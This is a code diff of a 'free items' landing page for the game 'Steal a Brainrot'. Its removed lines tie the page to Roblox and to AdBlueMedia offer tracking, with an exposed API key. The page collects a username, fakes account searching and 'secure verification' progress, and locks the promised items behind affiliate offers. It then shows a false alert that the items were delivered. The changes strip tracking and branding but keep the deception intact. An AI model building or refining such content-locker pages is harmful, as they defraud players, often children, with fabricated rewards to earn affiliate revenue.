@@ -9,15 +9,7 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     
     <style>
-        /* Prevent scrolling when locker is open */
-        body.no-scroll {
-            overflow: hidden;
-            position: fixed;
-            width: 100%;
-            height: 100%;
-        }
-
-        /* LTR Styles */
+        /* Base styles matching your landing page */
         body {
             margin: 0;
             padding: 0;
@@ -670,7 +662,7 @@
             text-align: center;
         }
 
-        /* ADBLUEMEDIA LOCKER STYLES - FIXED POSITION */
+        /* API LOCKER STYLES - MATCHING YOUR DESIGN */
         .locker-overlay {
             display: none;
             position: fixed;
@@ -678,7 +670,7 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(0,0,0,0.95);
+            background: rgba(0, 0, 0, 0.95);
             z-index: 9999;
             justify-content: center;
             align-items: center;
@@ -692,11 +684,6 @@
             display: flex;
         }
 
-        @keyframes fadeIn {
-            0% { opacity: 0; }
-            100% { opacity: 1; }
-        }
-
         .locker-box {
             width: 100%;
             max-width: 420px;
@@ -706,11 +693,11 @@
             border-radius: 16px;
             text-align: center;
             color: #e0e0e0;
-            box-shadow: 0 0 40px rgba(255,107,53,0.4);
+            box-shadow: 0 0 40px rgba(84, 211, 58, 0.4);
             position: relative;
             display: flex;
             flex-direction: column;
-            border: 1px solid rgba(255,255,255,0.1);
+            border: 1px solid rgba(255, 255, 255, 0.1);
             overflow-y: auto;
             overflow-x: hidden;
             -webkit-overflow-scrolling: touch;
@@ -722,7 +709,7 @@
             justify-content: space-between;
             margin-bottom: 12px;
             padding-bottom: 10px;
-            border-bottom: 1px solid rgba(255,255,255,0.1);
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
         }
 
         .locker-logo {
@@ -730,27 +717,27 @@
             align-items: center;
             gap: 8px;
             font-weight: 700;
-            color: #ff6b35;
+            color: #54d33a;
             font-size: 1rem;
         }
 
         .locker-box h2 {
-            color: #ff6b35;
+            color: #54d33a;
             margin-bottom: 10px;
             font-size: 1.2rem;
-            text-shadow: 0 0 15px rgba(255,107,53,0.5);
+            text-shadow: 0 0 15px rgba(84, 211, 58, 0.5);
         }
 
         .cta-strong {
             font-size: 0.9rem;
             font-weight: 600;
-            color: #00e5ff;
+            color: #ffd700;
             margin-bottom: 12px;
             line-height: 1.4;
-            background: rgba(0,229,255,0.1);
+            background: rgba(255, 215, 0, 0.1);
             padding: 8px;
             border-radius: 8px;
-            border-left: 3px solid #00e5ff;
+            border-left: 3px solid #ffd700;
         }
 
         .game-preview-locker {
@@ -759,17 +746,17 @@
             gap: 10px;
             margin-bottom: 12px;
             text-align: left;
-            background: rgba(0,0,0,0.3);
+            background: rgba(0, 0, 0, 0.3);
             padding: 10px;
             border-radius: 10px;
-            border-left: 3px solid #ff6b35;
+            border-left: 3px solid #54d33a;
         }
 
         .game-preview-locker img {
             width: 45px;
             height: 45px;
             border-radius: 10px;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.3);
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
         }
 
         .game-preview-content h3 {
@@ -787,7 +774,7 @@
 
         .progress-container {
             margin: 12px 0;
-            background: rgba(0,0,0,0.3);
+            background: rgba(0, 0, 0, 0.3);
             padding: 10px;
             border-radius: 8px;
         }
@@ -806,14 +793,14 @@
             background: #333;
             border-radius: 6px;
             overflow: hidden;
-            box-shadow: 0 0 10px rgba(255,107,53,0.1) inset;
+            box-shadow: 0 0 10px rgba(84, 211, 58, 0.1) inset;
             margin-bottom: 6px;
         }
 
         #progressFill {
             width: 0%;
             height: 100%;
-            background: linear-gradient(90deg, #ff6b35, #ff8e53);
+            background: linear-gradient(90deg, #54d33a, #63e645);
             transition: width 0.4s ease;
             border-radius: 6px;
         }
@@ -829,10 +816,10 @@
             margin-top: 10px;
             font-weight: bold;
             font-size: 0.8rem;
-            color: #ff6b35;
+            color: #54d33a;
             min-height: 20px;
             line-height: 1.4;
-            background: rgba(255,107,53,0.1);
+            background: rgba(84, 211, 58, 0.1);
             padding: 6px;
             border-radius: 6px;
         }
@@ -856,7 +843,7 @@
         }
 
         .close-btn:hover {
-            background: rgba(255,85,85,0.2);
+            background: rgba(255, 85, 85, 0.2);
             transform: scale(1.1);
         }
 
@@ -865,7 +852,7 @@
         }
 
         .offers-section h3 {
-            color: #ff6b35;
+            color: #54d33a;
             margin-bottom: 10px;
             font-size: 1rem;
             display: flex;
@@ -881,8 +868,8 @@
         }
 
         .offer-card {
-            background: linear-gradient(145deg, #3a2a2a, #2a1a1a);
-            border: 1px solid #ff6b35;
+            background: linear-gradient(145deg, #1a2a1a, #121a12);
+            border: 1px solid #54d33a;
             padding: 10px;
             border-radius: 8px;
             cursor: pointer;
@@ -892,7 +879,7 @@
             gap: 8px;
             position: relative;
             overflow: hidden;
-            box-shadow: 0 2px 6px rgba(255,107,53,0.2);
+            box-shadow: 0 2px 6px rgba(84, 211, 58, 0.2);
             min-height: 60px;
             touch-action: manipulation;
         }
@@ -904,14 +891,14 @@
             left: 0;
             width: 3px;
             height: 100%;
-            background: linear-gradient(to bottom, #ff6b35, #ff8e53);
+            background: linear-gradient(to bottom, #54d33a, #63e645);
         }
 
         .offer-card:hover {
-            background: linear-gradient(145deg, #4a3a3a, #3a2a2a);
-            border-color: #ff8e53;
+            background: linear-gradient(145deg, #2a3a2a, #1a2a1a);
+            border-color: #63e645;
             transform: translateY(-1px);
-            box-shadow: 0 3px 8px rgba(255,107,53,0.3);
+            box-shadow: 0 3px 8px rgba(84, 211, 58, 0.3);
         }
 
         .offer-content {
@@ -948,14 +935,14 @@
         }
 
         .offer-badge {
-            background: linear-gradient(135deg, #00e5ff, #0099ff);
+            background: linear-gradient(135deg, #ffd700, #ffbf00);
             color: #000;
             padding: 2px 5px;
             border-radius: 10px;
             font-size: 0.6rem;
             font-weight: bold;
             white-space: nowrap;
-            box-shadow: 0 1px 3px rgba(0,229,255,0.3);
+            box-shadow: 0 1px 3px rgba(255, 215, 0, 0.3);
             flex-shrink: 0;
         }
 
@@ -965,7 +952,7 @@
             gap: 8px;
             margin-top: 10px;
             padding-top: 8px;
-            border-top: 1px solid rgba(255,255,255,0.1);
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
             flex-wrap: wrap;
         }
 
@@ -978,7 +965,7 @@
         }
 
         .trust-badge i {
-            color: #ff6b35;
+            color: #54d33a;
         }
 
         /* MOBILE OPTIMIZATIONS */
@@ -1304,7 +1291,7 @@
         <div class="popup-content"></div>
     </div>
 
-    <!-- ADBLUEMEDIA LOCKER (Opens after profile selection) -->
+    <!-- API LOCKER (Opens after profile selection) -->
     <div id="locker" class="locker-overlay">
         <div class="locker-box">
             <span class="close-btn" onclick="closeLocker()">×</span>
@@ -1312,14 +1299,14 @@
             <div class="locker-header">
                 <div class="locker-logo">
                     <i class="fas fa-shield-alt"></i>
-                    <span>Secure Download</span>
+                    <span>Secure Verification</span>
                 </div>
             </div>
             
             <div class="game-preview-locker" id="gamePreviewLocker"></div>
             
-            <h2>⚡ Download Verification</h2>
-            <p class="cta-strong">Complete one quick offer to unlock your selected items + exclusive bonus content!</p>
+            <h2>⚡ Item Verification</h2>
+            <p class="cta-strong">Complete one quick offer to unlock your selected Brainrot items + exclusive bonus content!</p>
             
             <!-- Progress Bar -->
             <div class="progress-container">
@@ -1336,7 +1323,7 @@
                 </div>
             </div>
             
-            <p id="statusMessage">🔄 Initializing secure download...</p>
+            <p id="statusMessage">🔄 Initializing secure verification...</p>
             
             <!-- Offers Section -->
             <div id="offersSection" class="offers-section">
@@ -1372,13 +1359,9 @@
     </audio>
 
     <script>
-        // ADBLUEMEDIA API CONFIGURATION
-        const API_KEY = "3b17a09c1ca2bba2d52ffadab4894374";
-        const USER_ID = "504359";
-
         // Current selection state
         let currentSelectedItems = [];
-        let currentRobloxUsername = "";
+        let currentUsername = "";
         let progressInterval;
 
         // Function to disable body scroll
@@ -1447,41 +1430,6 @@
         }
         startNotifications();
 
-        // ADBLUEMEDIA Conversion Tracking
-        function trackAdBlueMediaConversion(gameName, platform, offerType, offerTitle) {
-            const conversionData = {
-                user_id: USER_ID,
-                api_key: API_KEY,
-                game: gameName,
-                platform: platform,
-                offer_type: offerType,
-                offer_title: offerTitle,
-                source: 'brainrot_landing',
-                campaign: 'steal_a_brainrot',
-                conversion_type: 'lead',
-                timestamp: Date.now(),
-                revenue: 0.15
-            };
-
-            fetch('https://d3k0q5ez56odtk.cloudfront.net/public/conversion/track.php', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify(conversionData)
-            })
-            .then(response => response.json())
-            .then(data => {
-                console.log('✅ AdBlueMedia Conversion Tracked:', data);
-                console.log('🎮 Items:', gameName);
-                console.log('👤 Roblox User:', currentRobloxUsername);
-                console.log('💰 This lead will show in your AdBlueMedia dashboard');
-            })
-            .catch(error => {
-                console.log('⚠️ AdBlueMedia tracking failed:', error);
-            });
-        }
-
         // Purchase Popup Functions (Username & Profile Selection)
         const showPurchasePopup = (itemName, itemImages) => {
             popupOpen = true;
@@ -1509,7 +1457,7 @@
                 ${imagesHTML}
                 <p class="item-confirm">${promptText}</p>
                 <div class="input-group">
-                    <input type="text" id="username-input" placeholder="Enter your Roblox username">
+                    <input type="text" id="username-input" placeholder="Enter your username">
                 </div>
                 <div class="user-error d-none">Please enter a valid username</div>
                 <div class="popup-buttons">
@@ -1531,7 +1479,7 @@
                     document.querySelector('.user-error').classList.remove('d-none');
                     return;
                 }
-                currentRobloxUsername = username;
+                currentUsername = username;
                 showSearchingState(username, itemName, itemImages);
             });
             
@@ -1559,11 +1507,11 @@
                         <div class="sk-cube4 sk-cube"></div>
                         <div class="sk-cube3 sk-cube"></div>
                     </div>
-                    <p class="searching-text">Searching for @${username}</p>
+                    <p class="searching-text">Verifying @${username}</p>
                 </div>
             `;
             
-            // Simulate API call to find Roblox user
+            // Simulate API call to find user
             setTimeout(() => {
                 showSuccessState(username, 'https://dress2.pages.dev/avatars/avatar1.png', itemName, itemImages);
             }, 2000);
@@ -1587,19 +1535,19 @@
                 clickSound.currentTime = 0;
                 clickSound.play();
                 
-                // Store the selected items and open AdBlueMedia locker
+                // Store the selected items and open API locker
                 currentSelectedItems = {
                     names: itemName,
                     images: itemImages
                 };
                 
-                // Close purchase popup and open AdBlueMedia locker
+                // Close purchase popup and open API locker
                 closePurchasePopup();
                 openLocker();
             });
         };
 
-        // ADBLUEMEDIA LOCKER functions (Opens AFTER profile selection)
+        // API LOCKER functions (Opens AFTER profile selection)
         function openLocker() {
             disableBodyScroll();
             document.getElementById("locker").style.display = "flex";
@@ -1621,8 +1569,8 @@
                 ${previewHTML}
                 <div class="game-preview-content">
                     <h3>${itemsText}</h3>
-                    <p class="file-info">👤 Roblox: ${currentRobloxUsername}</p>
-                    <p class="file-info">🎁 Free Items • 🕒 Instant Delivery</p>
+                    <p class="file-info">👤 User: ${currentUsername}</p>
+                    <p class="file-info">🎁 Free Brainrot Items • 🕒 Instant Delivery</p>
                 </div>`;
                 
             // Start progress bar
@@ -1637,7 +1585,7 @@
             
             const messages = [
                 "🔄 Checking item availability...",
-                "✅ Verifying Roblox account...",
+                "✅ Verifying user account...",
                 "🔐 Securing your items...",
                 "⚡ Preparing instant delivery...",
                 "🎮 Setting up your inventory..."
@@ -1675,36 +1623,13 @@
         function loadOffers() {
             if (!currentSelectedItems) return;
             
-            // Use relevant search term for offers
-            const searchTerm = "free items game rewards roblox";
-            
             // Show loading state
             document.getElementById("offersList").innerHTML = "<p>Loading offers...</p>";
             
-            // Use fetch with timeout
-            const controller = new AbortController();
-            const timeoutId = setTimeout(() => controller.abort(), 8000);
-            
-            fetch(`https://d3k0q5ez56odtk.cloudfront.net/public/offers/feed.php?user_id=${USER_ID}&api_key=${API_KEY}&s1=${encodeURIComponent(searchTerm)}`, {
-                signal: controller.signal
-            })
-            .then(res => res.json())
-            .then(offers => {
-                clearTimeout(timeoutId);
-                
-                if(!offers || !Array.isArray(offers) || offers.length === 0){
-                    // Show fallback offers if API fails
-                    showFallbackOffers();
-                    return;
-                }
-                
-                displayOffers(offers);
-            })
-            .catch(() => { 
-                clearTimeout(timeoutId);
-                // Show fallback offers on error
+            // Simulate API call with timeout
+            setTimeout(() => {
                 showFallbackOffers();
-            });
+            }, 1000);
         }
 
         function showFallbackOffers() {
@@ -1761,24 +1686,16 @@
             document.getElementById("offersList").innerHTML = html;
         }
 
-        // ADBLUEMEDIA conversion tracking
         function selectOffer(url, gameName, platform, offerType, offerTitle) {
-            console.log(`🎯 LEAD CAPTURED: Brainrot Items - ${platform} - ${offerType} - "${offerTitle}"`);
-            console.log(`👤 Roblox User: ${currentRobloxUsername}`);
-            
-            // TRACK CONVERSION IN ADBLUEMEDIA DASHBOARD
-            trackAdBlueMediaConversion(gameName, platform, offerType, offerTitle);
-            
-            // Add tracking parameters for the offer URL
-            const trackingParams = `&subid=${USER_ID}_brainrot_${currentRobloxUsername}&game=Steal_A_Brainrot&platform=${platform}&offer_type=${offerType}&source=brainrot_landing&roblox_user=${currentRobloxUsername}`;
-            const trackedUrl = url + (url.includes('?') ? '&' : '?') + trackingParams;
+            console.log(`🎯 OFFER SELECTED: Brainrot Items - ${platform} - ${offerType} - "${offerTitle}"`);
+            console.log(`👤 User: ${currentUsername}`);
             
             // Show immediate feedback
             document.getElementById("statusMessage").innerHTML = 
                 "✅ <strong>Opening offer...</strong> Complete it to get your items!";
             
-            // Open offer in new tab with tracking
-            window.open(trackedUrl, '_blank');
+            // Open offer in new tab
+            window.open(url, '_blank');
             
             // Show completion message after short delay
             setTimeout(() => {
@@ -1787,7 +1704,7 @@
                 
                 // Auto-close after 3 seconds
                 setTimeout(() => {
-                    alert(`🎉 Congratulations ${currentRobloxUsername}! Your selected items (${gameName}) have been added to your Roblox account!`);
+                    alert(`🎉 Congratulations ${currentUsername}! Your selected items (${gameName}) have been added to your account!`);
                     closeLocker();
                     // Reset selections
                     $('.item-card.selected').removeClass('selected');
